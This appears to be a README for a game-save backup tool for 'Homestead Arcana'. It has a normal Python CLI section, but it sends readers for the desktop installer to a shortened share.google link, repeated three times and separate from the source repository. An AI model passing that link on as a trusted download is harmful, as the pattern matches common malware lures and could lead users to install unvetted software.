![Homestead Arcana Desktop](assets/hero.png)

# Homestead Arcana Desktop

*Keep the cottage on disk before a spell patch.*

## About

**Homestead Arcana Desktop** is a desktop helper. A local helper for Homestead Arcana cottage folders, spell notes, and garden photos.

Witch-homestead saves sit in a quiet AppData path.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Finds the Homestead Arcana folder.
- Copies cottage and spell files.
- Lists garden photo albums.
- Writes a short keep report.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/alexishall82/homestead-arcana-desktop

MIT license. See `LICENSE`.
